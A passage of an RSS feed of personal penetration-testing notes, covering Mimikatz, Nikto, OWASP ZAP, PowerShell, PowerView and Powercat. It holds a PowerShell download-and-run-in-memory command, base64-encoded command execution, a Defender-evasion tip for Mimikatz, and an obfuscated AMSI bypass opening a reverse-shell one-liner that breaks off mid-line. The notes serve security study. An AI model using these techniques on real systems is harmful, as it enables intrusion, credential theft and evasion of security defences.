class=&quot;st&quot;&gt;&amp;quot;exit&amp;quot;&lt;/span&gt;&amp;#39; &amp;gt; C:\mkat.&lt;span class=&quot;fu&quot;&gt;txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that Microsoft Defender will still detect the execution of Invoke-Mimikatz and kill the hosting PowerShell process. This is why we need to redirect the output to a file.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;&gt;EmpireProject / Empire / data / module_source / credentials / Invoke-Mimikatz.ps1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20PowerShell.md&quot;&gt;Using PowerShell&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Mimikatz.md</guid>
		</item>
		<item>
			<title>Using Nikto</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Nikto.md</link>
			<description>&lt;p&gt;Nikto is a web application vulnerability scanner.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nikto&lt;/span&gt; -Format txt -host &lt;span class=&quot;va&quot;&gt;$URL&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;\&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;      &lt;span class=&quot;ex&quot;&gt;-output&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$OUTPUT_FILE_WITH_EXTENSION&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It can be used for basic web enumeration as well.&lt;/p&gt;&lt;p&gt;Getting help&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nikto&lt;/span&gt; -h            # Short help&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nikto&lt;/span&gt; -H            # Long help (all commands)&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;nikto&lt;/span&gt; -list-plugins # List plugins&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/ccpentesting&quot;&gt;TryHackMe: CC: Pen Testing&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://tryhackme.com/room/toolsrus&quot;&gt;TryHackMe: Tools'R'us&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://pentesting.one2bla.me/enumeration/web-enumeration&quot;&gt;web enumeration&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Nikto.md</guid>
		</item>
		<item>
			<title>Using OWASP ZAP</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20OWASP%20ZAP.md</link>
			<description>&lt;p&gt;ZAP (the &quot;Zed Attack Proxy&quot;) is basically an open-source version of Burp Suite. Burp Suite âï¸ ZAP equivalencies:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Site Map âï¸ Site Tree&lt;/li&gt;&lt;li&gt;HTTP History âï¸ History&lt;/li&gt;&lt;li&gt;Scope âï¸ Context&lt;/li&gt;&lt;li&gt;Interceptor (Proxy) âï¸ Break&lt;/li&gt;&lt;li&gt;Repeater âï¸ Request Editor&lt;/li&gt;&lt;li&gt;Intruder âï¸ Fuzzer&lt;/li&gt;&lt;li&gt;Spider âï¸ Spider&lt;/li&gt;&lt;li&gt;Scanner âï¸ Active Scan&lt;/li&gt;&lt;li&gt;BApp Store âï¸ Add On Marketplace&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;While ZAP has a very different interface than Burp Suite, you should basically approach using it in the same fashion.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Burp%20Suite.md&quot;&gt;Using Burp Suite&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;the-zap-browser&quot;&gt;The ZAP Browser&lt;/h2&gt;&lt;p&gt;At least on Kali Linux, ZAP can launch a pre-configured Firefox session using web automation; thus, like Burp Suite, there's really no need to configure a local proxy (and probably every reason not to - keep your profiles separate!).&lt;/p&gt;&lt;p&gt;One advantage of the ZAP browser is that it automatically passes session cookies back to ZAP!&lt;/p&gt;&lt;p&gt;One reason &lt;em&gt;not&lt;/em&gt; to use ZAP's browser, however, is that the user-agent is less generic than Burp Suite's.&lt;/p&gt;&lt;h2 id=&quot;automated-scans&quot;&gt;Automated Scans&lt;/h2&gt;&lt;p&gt;Automated scans can be fired off using the &quot;Automated Scan&quot; button on the ZAP Quick Start tab.&lt;/p&gt;&lt;p&gt;The &quot;traditional spider&quot; option spiders the website as you would expect, while the &quot;AJAX spider&quot; uses a headless browser to spider AJAX content.&lt;/p&gt;&lt;h2 id=&quot;directory-enumeration&quot;&gt;Directory Enumeration&lt;/h2&gt;&lt;p&gt;ZAP has gobuster-like functionality called &quot;Forced Browse&quot;. The wordlist can be configured in Tools &amp;gt; Options &amp;gt; Forced Browse; enumeration can be started by right-clicking on the target site and choosing Site &amp;gt; Force Browse Site.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22gobuster%22.md&quot;&gt;Using &quot;gobuster&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20OWASP%20ZAP.md</guid>
		</item>
		<item>
			<title>Using PowerShell</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20PowerShell.md</link>
			<description>&lt;h2 id=&quot;access-the-registry-through-powershell&quot;&gt;Access the Registry Through PowerShell&lt;/h2&gt;&lt;p&gt;You can actually access the registry from PowerShell using the &lt;code&gt;cd&lt;/code&gt; command: &lt;code&gt;cd HKLM:\&lt;/code&gt; will take you to the &lt;code&gt;HKEY_LOCAL_MACHINE&lt;/code&gt; hive, for instance.&lt;/p&gt;&lt;p&gt;Major hives:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;HKEY_CLASSES_ROOT&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;HKEY_CURRENT_USER&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;HKEY_LOCAL_MACHINE&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;HKEY_USERS&lt;/code&gt;&lt;/li&gt;&lt;li&gt;&lt;code&gt;HKEY_CURRENT_CONFIG&lt;/code&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;commands&quot;&gt;Commands&lt;/h2&gt;&lt;h3 id=&quot;accessing-windows-logs&quot;&gt;Accessing Windows Logs&lt;/h3&gt;&lt;p&gt;Use the &lt;code&gt;Get-WinEvent&lt;/code&gt; cmdlet.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Get-WinEvent.md&quot;&gt;Get-WinEvent&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;download-a-file&quot;&gt;Download a File&lt;/h3&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Download to disk&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;Invoke-WebRequest&lt;/span&gt; -Uri &lt;span class=&quot;va&quot;&gt;$URL_OF_FILE&lt;/span&gt; -OutFile &lt;span class=&quot;va&quot;&gt;$FILE_ON_DISK&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Download into a variable (useful for scripts!)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$SCRIPT_DATA&lt;/span&gt; = `&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    (&lt;span class=&quot;fu&quot;&gt;New-Object&lt;/span&gt; System.&lt;span class=&quot;fu&quot;&gt;Net&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Webclient&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;DownloadString&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot;$SCRIPT_URL&amp;quot;&lt;/span&gt;)&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Download and invoke from memory&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;IEX&lt;/span&gt; (&lt;span class=&quot;fu&quot;&gt;New-Object&lt;/span&gt; System.&lt;span class=&quot;fu&quot;&gt;Net&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Webclient&lt;/span&gt;).&lt;span class=&quot;fu&quot;&gt;DownloadString&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot;$SCRIPT_URL&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;using-base64-encoding&quot;&gt;Using Base64 Encoding&lt;/h3&gt;&lt;p&gt;Encode a command to base64 in PowerShell:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$Text&lt;/span&gt; = &lt;span class=&quot;st&quot;&gt;&amp;quot;$ONE_LINE_POWERSHELL_COMMAND&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$Bytes&lt;/span&gt; = [System.&lt;span class=&quot;fu&quot;&gt;Text&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Encoding&lt;/span&gt;]::Unicode.&lt;span class=&quot;fu&quot;&gt;GetBytes&lt;/span&gt;(&lt;span class=&quot;va&quot;&gt;$Text&lt;/span&gt;)&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$EncodedText&lt;/span&gt; = [Convert]::ToBase64String(&lt;span class=&quot;va&quot;&gt;$Bytes&lt;/span&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run this using:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;powershell.&lt;span class=&quot;fu&quot;&gt;exe&lt;/span&gt; -enc &lt;span class=&quot;va&quot;&gt;$EncodedText&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;manipulating-services&quot;&gt;Manipulating Services&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;Get-Service&lt;/code&gt; - list all services, or drill down on a particular service.&lt;/li&gt;&lt;li&gt;&lt;code&gt;Start-Service -Name $SERVICE&lt;/code&gt;/&lt;code&gt;sc.exe start $SERVICE&lt;/code&gt; - start $SERVICE.&lt;/li&gt;&lt;li&gt;&lt;code&gt;Stop-Service -Name $SERVICE&lt;/code&gt;/&lt;code&gt;sc.exe stop $SERVICE&lt;/code&gt; - stop $SERVICE.&lt;/li&gt;&lt;/ul&gt;&lt;h3 id=&quot;calculating-file-hashes&quot;&gt;Calculating File Hashes&lt;/h3&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Get-FileHash -Algorithm &lt;span class=&quot;va&quot;&gt;$ALGORITHM&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE_PATH&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The algorithm can be excluded (in which case SHA-256 is used). &lt;em&gt;Lots&lt;/em&gt; of different hashing algorithms are supported - run &lt;code&gt;help Get-FileHash&lt;/code&gt; to see a list.&lt;/p&gt;&lt;h3 id=&quot;powershell-remoting&quot;&gt;PowerShell Remoting&lt;/h3&gt;&lt;p&gt;Many large companies will enable PowerShell Remoting on all machines in order to ease IT support burdens (by default, remoting is only enabled on domain controllers).&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;Invoke-Command&lt;/span&gt; -ComputerName &lt;span class=&quot;va&quot;&gt;$MACHINE&lt;/span&gt; `&lt;/span&gt;
&lt;span id=&quot;cb5-2&quot;&gt;&lt;a href=&quot;#cb5-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;    -ScriptBlock {&lt;span class=&quot;va&quot;&gt;$COMMANDS_TO_RUN&lt;/span&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Remoting can be used to create a reverse shell.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;va&quot;&gt;$SESSION_NAME&lt;/span&gt; = &lt;span class=&quot;fu&quot;&gt;New-PSSession&lt;/span&gt; -ComputerName &lt;span class=&quot;st&quot;&gt;&amp;quot;$MACHINE&amp;quot;&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb6-2&quot;&gt;&lt;a href=&quot;#cb6-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;Enter-PSSession&lt;/span&gt; -Session &lt;span class=&quot;va&quot;&gt;$SESSION_NAME&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;run-powershell-from-cmdexe&quot;&gt;Run PowerShell from cmd.exe&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;powershell -c &lt;span class=&quot;st&quot;&gt;&amp;quot;$COMMAND&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20PowerShell.md</guid>
		</item>
		<item>
			<title>Using PowerView</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20PowerView.md</link>
			<description>&lt;p&gt;PowerView is a PowerShell reconnaissance tool. Note that AMSI will need to be disabled in the current session before it can be used.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot;&gt;PowerShellMafia / PowerSploit / Recon / PowerView.ps1&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20PowerShell.md&quot;&gt;Using PowerShell&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;domain-enumeration&quot;&gt;Domain Enumeration&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Get domain users and associated groups&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Get-DomainUsers | &lt;span class=&quot;fu&quot;&gt;select&lt;/span&gt; name, memberof&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Get all service accounts in a domain&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Get-DomainUsers -SPN&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Get all domain group members, including nested domain groups&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Get-DomainGroupMember -Identity &lt;span class=&quot;va&quot;&gt;$GROUP_NAME&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-12&quot;&gt;&lt;a href=&quot;#cb1-12&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-13&quot;&gt;&lt;a href=&quot;#cb1-13&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Show all users that previously logged on to a machine (defaults to&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-14&quot;&gt;&lt;a href=&quot;#cb1-14&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# local machine; requires admin privileges to be run against remote&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-15&quot;&gt;&lt;a href=&quot;#cb1-15&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# machines)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-16&quot;&gt;&lt;a href=&quot;#cb1-16&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-17&quot;&gt;&lt;a href=&quot;#cb1-17&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Get-NetLoggedon | &lt;span class=&quot;fu&quot;&gt;select&lt;/span&gt; UserName&lt;/span&gt;
&lt;span id=&quot;cb1-18&quot;&gt;&lt;a href=&quot;#cb1-18&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-19&quot;&gt;&lt;a href=&quot;#cb1-19&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Show all users who are logged in to a machine RIGHT NOW (does not&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-20&quot;&gt;&lt;a href=&quot;#cb1-20&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# require admin privileges for remote systems if run from Windows Server)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-21&quot;&gt;&lt;a href=&quot;#cb1-21&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-22&quot;&gt;&lt;a href=&quot;#cb1-22&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;Get-NetSession&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.offensive-security.com/offsec/offsec-live/&quot;&gt;OffSec Live&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20PowerView.md</guid>
		</item>
		<item>
			<title>Using Powercat</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Using%20Powercat.md</link>
			<description>&lt;p&gt;Powercat is a PowerShell-native reimplementation of netcat. Powercat can be installed on Kali Linux using &lt;code&gt;sudo apt install powercat&lt;/code&gt;.&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/besimorhino/powercat&quot;&gt;besimorhino / powercat&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20PowerShell.md&quot;&gt;Using PowerShell&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22netcat%22.md&quot;&gt;Using &quot;netcat&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;one-line-reverse-shell&quot;&gt;One Line Reverse Shell&lt;/h2&gt;&lt;p&gt;This disables AMSI, downloads Powercat into memory and invokes the module and then fires up a reverse shell.&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;[REF].&lt;span class=&quot;fu&quot;&gt;Assembly&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;GetType&lt;/span&gt;(&amp;#39;System.&lt;span class=&quot;fu&quot;&gt;Management&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Automation&lt;/span&gt;.&amp;#39;+$(&lt;span class=&quot;st&quot;&gt;&amp;quot;41 6D 73 69 55 74 69 6C 73&amp;quot;&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Split&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;)|&lt;span class=&quot;kw&quot;&gt;forEach&lt;/span&gt;{[&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt;]([convert]::toint16(&lt;span class=&quot;va&quot;&gt;$_&lt;/span&gt;,16))}|&lt;span class=&quot;kw&quot;&gt;forEach&lt;/span&gt;{&lt;span class=&quot;va&quot;&gt;$result&lt;/span&gt;=&lt;span class=&quot;va&quot;&gt;$result&lt;/span&gt;+&lt;span class=&quot;va&quot;&gt;$_&lt;/span&gt;};&lt;span class=&quot;va&quot;&gt;$result&lt;/span&gt;)).&lt;span class=&quot;fu&quot;&gt;GetField&lt;/span&gt;($(&lt;span class=&quot;st&quot;&gt;&amp;quot;61 6D 73 69 49 6E 69 74 46 61 69 6C 65 64&amp;quot;&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;Split&lt;/span&gt;(&lt;span class=&quot;st&quot;&gt;&amp;quot; &amp;quot;&lt;/span&gt;)|&lt;span class=&quot;kw&quot;&gt;forEach&lt;/span&gt;{[&lt;span class=&quot;dt&quot;&gt;char&lt;/span&gt;]([convert]::toint16(&lt;span class=&quot;va&quot;&gt;$_&lt;/span&gt;,16))}|&lt;span 